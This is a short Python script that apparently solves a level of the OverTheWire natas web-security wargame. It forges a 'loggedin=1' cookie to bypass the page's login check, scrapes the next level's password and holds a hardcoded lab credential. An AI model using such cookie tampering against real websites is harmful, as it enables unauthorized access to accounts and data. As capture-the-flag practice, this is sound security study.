import requests
import re

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = "http://natas5.natas.labs.overthewire.org"

session = requests.session()

cookies = { "loggedin" : "1"}

respones = session.get(url, auth=(username, password), cookies=cookies)
content = (respones.text)

flag = re.findall("The password for natas6 is (.*)</div>", content)[0]
print(flag)
